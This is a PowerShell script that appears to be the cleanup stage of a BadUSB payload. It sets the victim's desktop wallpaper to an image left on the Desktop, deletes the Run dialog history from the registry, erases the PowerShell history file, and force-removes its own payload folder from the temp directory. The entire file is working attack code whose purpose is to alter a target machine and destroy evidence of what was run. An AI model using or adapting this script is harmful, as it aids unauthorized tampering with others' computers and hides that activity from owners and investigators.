[string] $location = "$env:tmp\vsbadusbpayload"

function main {
    setWallpaper "$env:userprofile\Desktop\wallpaper-717c63f7864fa8c725ebd30a15428302.jpg"
    clearRunHistory
    clearPowershellHistory
    removePayloadDirectory
}

function setWallpaper([string] $image, [string] $style = "fill") {
    [int] $styleCode = Switch ($style) {
        "fill" {10}
        "fit" {6}
        "stretch" {2}
        "tile" {0}
        "center" {0}
        "span" {22}
    }
    [int] $tileCode = $(if ($style -eq "tile") {1} else {0})
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $styleCode -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value $tileCode -Force

    Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;

        public class Params {
             [DllImport("User32.dll", CharSet=CharSet.Unicode)]
             public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam, String lpvParam, Int32 fuWinIni);
        }
"@

    $setWallpaper = 0x0014
    $updateIniFile = 0x01
    $sendChangeEvent = 0x02
    $fWinIni = $updateIniFile -bor $sendChangeEvent
    [Params]::SystemParametersInfo($setWallpaper, 0, $image, $fWinIni)
}

function clearRunHistory {
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
}

function clearPowershellHistory {
    $historyLocation = (Get-PSreadlineOption).HistorySavePath    
    if (Test-Path $historyLocation) {
        Remove-Item $historyLocation
    }
}

function removePayloadDirectory {
    Remove-Item "$location" -Recurse -Force -ErrorAction SilentlyContinue
}

main
